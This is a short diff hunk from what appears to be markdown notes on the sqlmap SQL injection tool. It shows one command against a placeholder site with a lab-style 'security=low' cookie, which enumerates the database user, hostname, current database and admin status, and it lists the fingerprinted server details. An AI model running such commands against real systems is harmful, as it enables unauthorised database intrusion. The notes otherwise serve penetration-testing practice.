@@ -16,7 +16,7 @@ options--
 #### more examples  
 `sqlmap -u "http://example.com/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdfsfsfsfsfslfjafj; security=low" --current-user --hostname --current-db --is-dba --thread=6`  
 gives this info  
-```
+
 * `Linux Ubuntu`  
 * `Apache 2.4.7, PHP 5.5.9`  
 * `MySQL >= 5.0.12`  
